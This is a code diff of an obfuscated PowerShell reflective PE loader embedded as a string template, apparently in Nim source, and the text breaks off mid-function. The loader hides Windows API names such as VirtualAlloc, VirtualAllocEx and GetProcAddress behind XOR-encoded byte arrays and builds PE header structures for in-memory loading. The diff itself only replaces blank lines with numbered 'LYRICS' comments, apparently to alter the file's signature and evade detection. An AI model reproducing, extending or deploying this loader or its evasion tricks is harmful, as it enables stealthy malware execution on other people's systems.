@@ -1,122 +1,136 @@
 let Powershelltemplate* = """
 
 function FUN000 {
-
+# LYRICS001
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $true)]
         [ValidateNotNullOrEmpty()]
         [Byte[]]
         $VAR001,
-
+# LYRICS002
         [Parameter(Position = 1)]
         [String[]]
         $VAR002,
-
+# LYRICS003
         [Parameter(Position = 2)]
         [ValidateSet( 'WideStr', 'Str', 'NoOutput', 'DefaultSettings' )]
         [String]
         $VAR003 = 'DefaultSettings',
-
+# LYRICS004
         [Parameter(Position = 3)]
         [String]
         $VAR004,
-
+# LYRICS005
         [Parameter(Position = 4)]
         [Int32]
         $VAR005,
-
+# LYRICS006
         [Parameter(Position = 5)]
         [String]
         $VAR006,
-
+# LYRICS007
         [Switch]
         $VAR007,
-
+# LYRICS008
         [Switch]
         $VAR008
     )
-
+# LYRICS009
     Set-StrictMode -Version 2
-
-
+# LYRICS010
+# LYRICS011
     $VAR009 = {
         [CmdletBinding()]
         Param(
             [Parameter(Position = 0, Mandatory = $true)]
             [Byte[]]
             $VAR001,
-
+# LYRICS012
             [Parameter(Position = 1, Mandatory = $true)]
             [String]
             $VAR003,
-
+# LYRICS013
             [Parameter(Position = 2, Mandatory = $true)]
             [Int32]
             $VAR005,
-
+# LYRICS014
             [Parameter(Position = 3, Mandatory = $true)]
             [String]
             $VAR006,
-
+# LYRICS015
             [Parameter(Position = 4, Mandatory = $true)]
             [Bool]
             $VAR007,
-
+# LYRICS016
             [Parameter(Position = 5, Mandatory = $true)]
             [String]
             $VAR004
         )
-    
-        
-      
-        
+# LYRICS017
+# LYRICS018
+# LYRICS019
+# LYRICS020
         Function FUN001 {
+# LYRICS021
+# LYRICS022
             $VAR010 = New-Object System.Object
-
-            
-            
+# LYRICS023
+# LYRICS024
+# LYRICS025
             $Domain = [AppDomain]::CurrentDomain
+# LYRICS026
+# LYRICS027
             $VAR012 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+# LYRICS028
+# LYRICS029
             $VAR013 = $Domain.DefineDynamicAssembly($VAR012, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
             $VAR014 = $VAR013.DefineDynamicModule('DynamicModule', $false)
+# LYRICS030
+# LYRICS031
             $VAR015 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
-
-
-            
-            
+# LYRICS032
+# LYRICS033
+# LYRICS034
+# LYRICS035
             $VAR011 = $VAR014.DefineEnum('MachineType', 'Public', [UInt16])
             $VAR011.DefineLiteral('Native', [UInt16] 0) | Out-Null
             $VAR011.DefineLiteral('CONST089', [UInt16] 0x014c) | Out-Null
             $VAR011.DefineLiteral('CONST090', [UInt16] 0x0200) | Out-Null
+# LYRICS036
+# LYRICS037
             $VAR011.DefineLiteral('CONST091', [UInt16] 0x8664) | Out-Null
             $VAR016 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name MachineType -Value $VAR016
-
-            
+# LYRICS038
+# LYRICS039
             $VAR011 = $VAR014.DefineEnum('MagicType', 'Public', [UInt16])
             $VAR011.DefineLiteral('CONST100', [UInt16] 0x10b) | Out-Null
             $VAR011.DefineLiteral('CONST101', [UInt16] 0x20b) | Out-Null
             $VAR021 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name MagicType -Value $VAR021
-
-            
+# LYRICS040
+# LYRICS041
             $VAR011 = $VAR014.DefineEnum('CONST047Type', 'Public', [UInt16])
             $VAR011.DefineLiteral('CONST102', [UInt16] 0) | Out-Null
             $VAR011.DefineLiteral('CONST103', [UInt16] 1) | Out-Null
             $VAR011.DefineLiteral('CONST104', [UInt16] 2) | Out-Null
             $VAR011.DefineLiteral('CONST099', [UInt16] 3) | Out-Null
             $VAR011.DefineLiteral('CONST098', [UInt16] 7) | Out-Null
+# LYRICS042
+# LYRICS043
             $VAR011.DefineLiteral('CONST097', [UInt16] 9) | Out-Null
             $VAR011.DefineLiteral('CONST096', [UInt16] 10) | Out-Null
             $VAR011.DefineLiteral('CONST095', [UInt16] 11) | Out-Null
             $VAR011.DefineLiteral('CONST094', [UInt16] 12) | Out-Null
+# LYRICS044
+# LYRICS045
             $VAR011.DefineLiteral('CONST093', [UInt16] 13) | Out-Null
             $VAR011.DefineLiteral('CONST092', [UInt16] 14) | Out-Null
             $VAR017 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST047Type -Value $VAR017
-
-            
+# LYRICS046
+# LYRICS047
             $VAR011 = $VAR014.DefineEnum('CONST035Type', 'Public', [UInt16])
             $VAR011.DefineLiteral('CONST080', [UInt16] 0x0001) | Out-Null
             $VAR011.DefineLiteral('CONST079', [UInt16] 0x0002) | Out-Null
@@ -124,6 +138,8 @@ function FUN000 {
             $VAR011.DefineLiteral('CONST077', [UInt16] 0x0008) | Out-Null
             $VAR011.DefineLiteral('CONST088', [UInt16] 0x0040) | Out-Null
             $VAR011.DefineLiteral('CONST087', [UInt16] 0x0080) | Out-Null
+# LYRICS048
+# LYRICS049
             $VAR011.DefineLiteral('CONST086', [UInt16] 0x0100) | Out-Null
             $VAR011.DefineLiteral('CONST085', [UInt16] 0x0200) | Out-Null
             $VAR011.DefineLiteral('CONST084', [UInt16] 0x0400) | Out-Null
@@ -133,35 +149,41 @@ function FUN000 {
             $VAR011.DefineLiteral('CONST081', [UInt16] 0x8000) | Out-Null
             $VAR018 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST035Type -Value $VAR018
-
-            
-            
+# LYRICS050
+# LYRICS051
+# LYRICS052
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST075', $VAR019, [System.ValueType], 8)
         ($VAR011.DefineField('CONST074', [UInt32], 'Public')).SetOffset(0) | Out-Null
+# LYRICS053
+# LYRICS054
         ($VAR011.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
             $VAR020 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST075 -Value $VAR020
-
-            
+# LYRICS055
+# LYRICS056
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST073', $VAR019, [System.ValueType], 20)
             $VAR011.DefineField('Machine', [UInt16], 'Public') | Out-Null
             $VAR011.DefineField('CONST072', [UInt16], 'Public') | Out-Null
             $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
+# LYRICS057
+# LYRICS058
             $VAR011.DefineField('CONST070', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST069', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST068', [UInt16], 'Public') | Out-Null
             $VAR011.DefineField('CONST067', [UInt16], 'Public') | Out-Null
             $VAR022 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST073 -Value $VAR022
-
-            
+# LYRICS059
+# LYRICS060
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST066', $VAR019, [System.ValueType], 240)
         ($VAR011.DefineField('Magic', $VAR021, 'Public')).SetOffset(0) | Out-Null
         ($VAR011.DefineField('CONST065', [Byte], 'Public')).SetOffset(2) | Out-Null
         ($VAR011.DefineField('CONST064', [Byte], 'Public')).SetOffset(3) | Out-Null
+# LYRICS061
+# LYRICS062
         ($VAR011.DefineField('CONST063', [UInt32], 'Public')).SetOffset(4) | Out-Null
         ($VAR011.DefineField('CONST062', [UInt32], 'Public')).SetOffset(8) | Out-Null
         ($VAR011.DefineField('CONST061', [UInt32], 'Public')).SetOffset(12) | Out-Null
@@ -170,12 +192,16 @@ function FUN000 {
         ($VAR011.DefineField('CONST058', [UInt64], 'Public')).SetOffset(24) | Out-Null
         ($VAR011.DefineField('CONST057', [UInt32], 'Public')).SetOffset(32) | Out-Null
         ($VAR011.DefineField('CONST056', [UInt32], 'Public')).SetOffset(36) | Out-Null
+# LYRICS063
+# LYRICS064
         ($VAR011.DefineField('CONST055', [UInt16], 'Public')).SetOffset(40) | Out-Null
         ($VAR011.DefineField('CONST054', [UInt16], 'Public')).SetOffset(42) | Out-Null
         ($VAR011.DefineField('CONST053', [UInt16], 'Public')).SetOffset(44) | Out-Null
         ($VAR011.DefineField('CONST052', [UInt16], 'Public')).SetOffset(46) | Out-Null
         ($VAR011.DefineField('CONST051', [UInt16], 'Public')).SetOffset(48) | Out-Null
         ($VAR011.DefineField('CONST050', [UInt16], 'Public')).SetOffset(50) | Out-Null
+# LYRICS065
+# LYRICS066
         ($VAR011.DefineField('CONST049', [UInt32], 'Public')).SetOffset(52) | Out-Null
         ($VAR011.DefineField('CONST033', [UInt32], 'Public')).SetOffset(56) | Out-Null
         ($VAR011.DefineField('CONST034', [UInt32], 'Public')).SetOffset(60) | Out-Null
@@ -186,6 +212,8 @@ function FUN000 {
         ($VAR011.DefineField('CONST045', [UInt64], 'Public')).SetOffset(80) | Out-Null
         ($VAR011.DefineField('CONST044', [UInt64], 'Public')).SetOffset(88) | Out-Null
         ($VAR011.DefineField('CONST043', [UInt64], 'Public')).SetOffset(96) | Out-Null
+# LYRICS067
+# LYRICS068
         ($VAR011.DefineField('CONST105', [UInt32], 'Public')).SetOffset(104) | Out-Null
         ($VAR011.DefineField('CONST106', [UInt32], 'Public')).SetOffset(108) | Out-Null
         ($VAR011.DefineField('CONST107', $VAR020, 'Public')).SetOffset(112) | Out-Null
@@ -195,25 +223,33 @@ function FUN000 {
         ($VAR011.DefineField('CONST111', $VAR020, 'Public')).SetOffset(144) | Out-Null
         ($VAR011.DefineField('CONST112', $VAR020, 'Public')).SetOffset(152) | Out-Null
         ($VAR011.DefineField('Debug', $VAR020, 'Public')).SetOffset(160) | Out-Null
+# LYRICS069
+# LYRICS070
         ($VAR011.DefineField('Architecture', $VAR020, 'Public')).SetOffset(168) | Out-Null
         ($VAR011.DefineField('CONST113', $VAR020, 'Public')).SetOffset(176) | Out-Null
         ($VAR011.DefineField('CONST114', $VAR020, 'Public')).SetOffset(184) | Out-Null
         ($VAR011.DefineField('CONST115', $VAR020, 'Public')).SetOffset(192) | Out-Null
         ($VAR011.DefineField('CONST120', $VAR020, 'Public')).SetOffset(200) | Out-Null
+# LYRICS071
+# LYRICS072
         ($VAR011.DefineField('IAT', $VAR020, 'Public')).SetOffset(208) | Out-Null
         ($VAR011.DefineField('CONST116', $VAR020, 'Public')).SetOffset(216) | Out-Null
         ($VAR011.DefineField('CONST117', $VAR020, 'Public')).SetOffset(224) | Out-Null
+# LYRICS073
+# LYRICS074
         ($VAR011.DefineField('Reserved', $VAR020, 'Public')).SetOffset(232) | Out-Null
             $VAR023 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST066 -Value $VAR023
-
-            
+# LYRICS075
+# LYRICS076
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST118', $VAR019, [System.ValueType], 224)
         ($VAR011.DefineField('Magic', $VAR021, 'Public')).SetOffset(0) | Out-Null
         ($VAR011.DefineField('CONST065', [Byte], 'Public')).SetOffset(2) | Out-Null
         ($VAR011.DefineField('CONST064', [Byte], 'Public')).SetOffset(3) | Out-Null
         ($VAR011.DefineField('CONST063', [UInt32], 'Public')).SetOffset(4) | Out-Null
+# LYRICS077
+# LYRICS078
         ($VAR011.DefineField('CONST062', [UInt32], 'Public')).SetOffset(8) | Out-Null
         ($VAR011.DefineField('CONST061', [UInt32], 'Public')).SetOffset(12) | Out-Null
         ($VAR011.DefineField('CONST060', [UInt32], 'Public')).SetOffset(16) | Out-Null
@@ -224,6 +260,8 @@ function FUN000 {
         ($VAR011.DefineField('CONST056', [UInt32], 'Public')).SetOffset(36) | Out-Null
         ($VAR011.DefineField('CONST055', [UInt16], 'Public')).SetOffset(40) | Out-Null
         ($VAR011.DefineField('CONST054', [UInt16], 'Public')).SetOffset(42) | Out-Null
+# LYRICS079
+# LYRICS080
         ($VAR011.DefineField('CONST053', [UInt16], 'Public')).SetOffset(44) | Out-Null
         ($VAR011.DefineField('CONST052', [UInt16], 'Public')).SetOffset(46) | Out-Null
         ($VAR011.DefineField('CONST051', [UInt16], 'Public')).SetOffset(48) | Out-Null
@@ -236,6 +274,8 @@ function FUN000 {
         ($VAR011.DefineField('CONST035', $VAR018, 'Public')).SetOffset(70) | Out-Null
         ($VAR011.DefineField('CONST046', [UInt32], 'Public')).SetOffset(72) | Out-Null
         ($VAR011.DefineField('CONST045', [UInt32], 'Public')).SetOffset(76) | Out-Null
+# LYRICS081
+# LYRICS082
         ($VAR011.DefineField('CONST044', [UInt32], 'Public')).SetOffset(80) | Out-Null
         ($VAR011.DefineField('CONST043', [UInt32], 'Public')).SetOffset(84) | Out-Null
         ($VAR011.DefineField('CONST105', [UInt32], 'Public')).SetOffset(88) | Out-Null
@@ -249,40 +289,56 @@ function FUN000 {
         ($VAR011.DefineField('Debug', $VAR020, 'Public')).SetOffset(144) | Out-Null
         ($VAR011.DefineField('Architecture', $VAR020, 'Public')).SetOffset(152) | Out-Null
         ($VAR011.DefineField('CONST113', $VAR020, 'Public')).SetOffset(160) | Out-Null
+# LYRICS083
+# LYRICS084
         ($VAR011.DefineField('CONST114', $VAR020, 'Public')).SetOffset(168) | Out-Null
         ($VAR011.DefineField('CONST115', $VAR020, 'Public')).SetOffset(176) | Out-Null
         ($VAR011.DefineField('CONST120', $VAR020, 'Public')).SetOffset(184) | Out-Null
         ($VAR011.DefineField('IAT', $VAR020, 'Public')).SetOffset(192) | Out-Null
+# LYRICS085
+# LYRICS086
         ($VAR011.DefineField('CONST116', $VAR020, 'Public')).SetOffset(200) | Out-Null
         ($VAR011.DefineField('CONST117', $VAR020, 'Public')).SetOffset(208) | Out-Null
         ($VAR011.DefineField('Reserved', $VAR020, 'Public')).SetOffset(216) | Out-Null
             $VAR024 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST118 -Value $VAR024
-
-            
+# LYRICS087
+# LYRICS088
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST03164', $VAR019, [System.ValueType], 264)
             $VAR011.DefineField('Signature', [UInt32], 'Public') | Out-Null
+# LYRICS089
+# LYRICS090
             $VAR011.DefineField('CONST121', $VAR022, 'Public') | Out-Null
             $VAR011.DefineField('CONST122', $VAR023, 'Public') | Out-Null
+# LYRICS091
+# LYRICS092
             $VAR025 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST03164 -Value $VAR025
-
-            
+# LYRICS093
+# LYRICS094
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+# LYRICS095
+# LYRICS096
             $VAR011 = $VAR014.DefineType('CONST03132', $VAR019, [System.ValueType], 248)
             $VAR011.DefineField('Signature', [UInt32], 'Public') | Out-Null
+# LYRICS097
+# LYRICS098
             $VAR011.DefineField('CONST121', $VAR022, 'Public') | Out-Null
             $VAR011.DefineField('CONST122', $VAR024, 'Public') | Out-Null
             $VAR026 = $VAR011.CreateType()
+# LYRICS099
+# LYRICS100
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST03132 -Value $VAR026
-
-            
+# LYRICS101
+# LYRICS102
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST123', $VAR019, [System.ValueType], 64)
             $VAR011.DefineField('CONST124', [UInt16], 'Public') | Out-Null
             $VAR011.DefineField('CONST125', [UInt16], 'Public') | Out-Null
             $VAR011.DefineField('CONST126', [UInt16], 'Public') | Out-Null
+# LYRICS103
+# LYRICS104
             $VAR011.DefineField('CONST127', [UInt16], 'Public') | Out-Null
             $VAR011.DefineField('CONST128', [UInt16], 'Public') | Out-Null
             $VAR011.DefineField('CONST129', [UInt16], 'Public') | Out-Null
@@ -292,68 +348,97 @@ function FUN000 {
             $VAR011.DefineField('CONST133', [UInt16], 'Public') | Out-Null
             $VAR011.DefineField('CONST134', [UInt16], 'Public') | Out-Null
             $VAR011.DefineField('CONST135', [UInt16], 'Public') | Out-Null
+# LYRICS105
+# LYRICS106
             $VAR011.DefineField('CONST136', [UInt16], 'Public') | Out-Null
             $VAR011.DefineField('CONST137', [UInt16], 'Public') | Out-Null
-
+# LYRICS107
             $VAR027 = $VAR011.DefineField('CONST138', [UInt16[]], 'Public, HasFieldMarshal')
+# LYRICS108
+# LYRICS109
             $VAR028 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
             $VAR029 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
+# LYRICS110
+# LYRICS111
             $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 4))
             $VAR027.SetCustomAttribute($VAR030)
-
+# LYRICS112
             $VAR011.DefineField('CONST139', [UInt16], 'Public') | Out-Null
+# LYRICS113
+# LYRICS114
             $VAR011.DefineField('CONST140', [UInt16], 'Public') | Out-Null
-
+# LYRICS115
+# LYRICS116
             $VAR031 = $VAR011.DefineField('CONST1382', [UInt16[]], 'Public, HasFieldMarshal')
             $VAR028 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
+# LYRICS117
+# LYRICS118
             $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 10))
+# LYRICS119
+# LYRICS120
             $VAR031.SetCustomAttribute($VAR030)
-
+# LYRICS121
             $VAR011.DefineField('CONST141', [Int32], 'Public') | Out-Null
             $VAR032 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST123 -Value $VAR032
-
-            
+# LYRICS122
+# LYRICS123
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST142', $VAR019, [System.ValueType], 40)
-
+# LYRICS124
+# LYRICS125
+# LYRICS126
             $VAR033 = $VAR011.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
             $VAR028 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
+# LYRICS127
+# LYRICS128
             $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 8))
             $VAR033.SetCustomAttribute($VAR030)
-
+# LYRICS129
             $VAR011.DefineField('CONST143', [UInt32], 'Public') | Out-Null
+# LYRICS130
+# LYRICS131
             $VAR011.DefineField('CONST074', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST144', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST145', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST146', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST147', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST148', [UInt16], 'Public') | Out-Null
+# LYRICS132
+# LYRICS133
             $VAR011.DefineField('CONST149', [UInt16], 'Public') | Out-Null
+# LYRICS134
+# LYRICS135
             $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
             $VAR034 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST142 -Value $VAR034
-
-            
+# LYRICS136
+# LYRICS137
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST150', $VAR019, [System.ValueType], 8)
             $VAR011.DefineField('CONST074', [UInt32], 'Public') | Out-Null
+# LYRICS138
+# LYRICS139
             $VAR011.DefineField('CONST151', [UInt32], 'Public') | Out-Null
             $VAR035 = $VAR011.CreateType()
+# LYRICS140
+# LYRICS141
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST150 -Value $VAR035
-
-            
+# LYRICS142
+# LYRICS143
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST152', $VAR019, [System.ValueType], 20)
             $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
+# LYRICS144
+# LYRICS145
             $VAR011.DefineField('CONST153', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('Name', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST154', [UInt32], 'Public') | Out-Null
             $VAR036 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST152 -Value $VAR036
-
-            
+# LYRICS146
+# LYRICS147
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST155', $VAR019, [System.ValueType], 40)
             $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
@@ -364,39 +449,45 @@ function FUN000 {
             $VAR011.DefineField('Base', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST158', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST159', [UInt32], 'Public') | Out-Null
+# LYRICS148
+# LYRICS149
             $VAR011.DefineField('CONST160', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST161', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST162', [UInt32], 'Public') | Out-Null
             $VAR037 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST155 -Value $VAR037
-
-            
+# LYRICS150
+# LYRICS151
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST163', $VAR019, [System.ValueType], 8)
             $VAR011.DefineField('CONST164', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST165', [UInt32], 'Public') | Out-Null
             $VAR038 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST163 -Value $VAR038
-
-            
+# LYRICS152
+# LYRICS153
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST166', $VAR019, [System.ValueType], 12)
             $VAR011.DefineField('CONST163', $VAR038, 'Public') | Out-Null
+# LYRICS154
+# LYRICS155
             $VAR011.DefineField('Attributes', [UInt32], 'Public') | Out-Null
             $VAR039 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST166 -Value $VAR039
-
-            
+# LYRICS156
+# LYRICS157
             $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
             $VAR011 = $VAR014.DefineType('CONST167', $VAR019, [System.ValueType], 16)
+# LYRICS158
+# LYRICS159
             $VAR011.DefineField('CONST168', [UInt32], 'Public') | Out-Null
             $VAR011.DefineField('CONST169', $VAR039, 'Public') | Out-Null
             $VAR040 = $VAR011.CreateType()
             $VAR010 | Add-Member -MemberType NoteProperty -Name CONST167 -Value $VAR040
-
+# LYRICS160
             return $VAR010
         }
-
+# LYRICS161
         Function FUN100
         {
         Param(
@@ -404,52 +495,78 @@ function FUN000 {
                 [byte[]]
                 $VAR0320
             )
+# LYRICS162
             $VAR0322 = [Byte]0x5A
+# LYRICS163
+# LYRICS164
             $VAR0321 = for ($i = 0; $i -lt $VAR0320.Length; $i++) { [char]([Byte]$VAR0320[$i] -bxor $VAR0322) } -join ''
-            #$VA#Write-Host $VAR0321
-            #[String]($VAR0321 | ForEach-Object { $_ }) -join ""
+# LYRICS165
+# LYRICS166
+# LYRICS167
             return [String]($VAR0321 | ForEach-Object { $_ }) -join ""
-            
+# LYRICS168
         }
-
+# LYRICS169
         $VAR0303 = [Byte]0x5A
         $VAR0300 = 49,63,40,52,63,54,105,104,116,62,54,54
+# LYRICS170
+# LYRICS171
         $VAR0301 = for ($i = 0; $i -lt $VAR0300.Length; $i++) { [char]([Byte]$VAR0300[$i] -bxor $VAR0303) } -join ''
         $VAR0302 = ($VAR0301 | ForEach-Object { $_ }) -join ""
-
+# LYRICS172
         $VAR0304 = 27,62,44,59,42,51,105,104,116,62,54,54
         $VAR0305 = for ($i = 0; $i -lt $VAR0304.Length; $i++) { [char]([Byte]$VAR0304[$i] -bxor $VAR0303) } -join ''
+# LYRICS173
+# LYRICS174
         $VAR0306 = ($VAR0305 | ForEach-Object { $_ }) -join ""
-
+# LYRICS175
         $VAR0307 = 55,41,44,57,40,46,116,62,54,54
         $VAR0308 = for ($i = 0; $i -lt $VAR0307.Length; $i++) { [char]([Byte]$VAR0307[$i] -bxor $VAR0303) } -join ''
+# LYRICS176
+# LYRICS177
         $VAR0309 = ($VAR0308 | ForEach-Object { $_ }) -join ""
-
+# LYRICS178
         $VAR0310 = 29,63,46,10,40,53,57,27,62,62,40,63,41,41
+# LYRICS179
+# LYRICS180
         $VAR0311 = for ($i = 0; $i -lt $VAR0310.Length; $i++) { [char]([Byte]$VAR0310[$i] -bxor $VAR0303) } -join ''
+# LYRICS181
+# LYRICS182
         $VAR0312 = ($VAR0311 | ForEach-Object { $_ }) -join ""
-
+# LYRICS183
         $VAR0313 = 12,51,40,46,47,59,54,27,54,54,53,57
         $VAR0314 = for ($i = 0; $i -lt $VAR0313.Length; $i++) { [char]([Byte]$VAR0313[$i] -bxor $VAR0303) } -join ''
+# LYRICS184
+# LYRICS185
         $VAR0315 = ($VAR0314 | ForEach-Object { $_ }) -join ''
-
+# LYRICS186
         $VAR0316 = 12,51,40,46,47,59,54,27,54,54,53,57,31,34
         $VAR0317 = for ($i = 0; $i -lt $VAR0316.Length; $i++) { [char]([Byte]$VAR0316[$i] -bxor $VAR0303) } -join ''
+# LYRICS187
+# LYRICS188
         $VAR0318 = ($VAR0317 | ForEach-Object { $_ }) -join ''
-
+# LYRICS189
                     $VAR0327 = 22,53,59,62,22,51,56,40,59,40,35,27
+# LYRICS190
+# LYRICS191
             $VAR0328 = for ($i = 0; $i -lt $VAR0327.Length; $i++) { [char]([Byte]$VAR0327[$i] -bxor $VAR0303) } -join ''
             $VAR0329 = ($VAR0328 | ForEach-Object { $_ }) -join ''
-
-
-
+# LYRICS192
+# LYRICS193
+# LYRICS194
         Function FUN002 {
+# LYRICS195
+# LYRICS196
             $VAR0041 = New-Object System.Object
-
+# LYRICS197
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST001 -Value 0x00001000
+# LYRICS198
+# LYRICS199
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST002 -Value 0x00002000
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST003 -Value 0x01
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST004 -Value 0x02
+# LYRICS200
+# LYRICS201
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST005 -Value 0x04
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST006 -Value 0x08
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST007 -Value 0x10
@@ -461,233 +578,310 @@ function FUN000 {
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST013 -Value 3
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST014 -Value 10
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST015 -Value 0x02000000
+# LYRICS202
+# LYRICS203
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST016 -Value 0x20000000
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST017 -Value 0x40000000
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST018 -Value 0x80000000
+# LYRICS204
+# LYRICS205
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST019 -Value 0x04000000
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST020 -Value 0x4000
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST021 -Value 0x0002
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST022 -Value 0x2000
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST023 -Value 0x40
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST024 -Value 0x100
+# LYRICS206
+# LYRICS207
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST025 -Value 0x8000
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST026 -Value 0x0008
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST027 -Value 0x0020
+# LYRICS208
+# LYRICS209
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST028 -Value 0x2
             $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST029 -Value 0x3f0
-
+# LYRICS210
             return $VAR0041
         }
-
+# LYRICS211
         Function FUN003 {
+# LYRICS212
+# LYRICS213
             $VAR0042 = New-Object System.Object
-
+# LYRICS214
             $VAR0043 = FUN012 $VAR0302 $VAR0315
             $VAR0044 = FUN011 @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+# LYRICS215
+# LYRICS216
             $VAR0045 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0043, $VAR0044)
             $VAR0042 | Add-Member NoteProperty -Name FUN031 -Value $VAR0045
-
+# LYRICS217
             $VAR0046 = FUN012 $VAR0302 $VAR0318
             $VAR0047 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+# LYRICS218
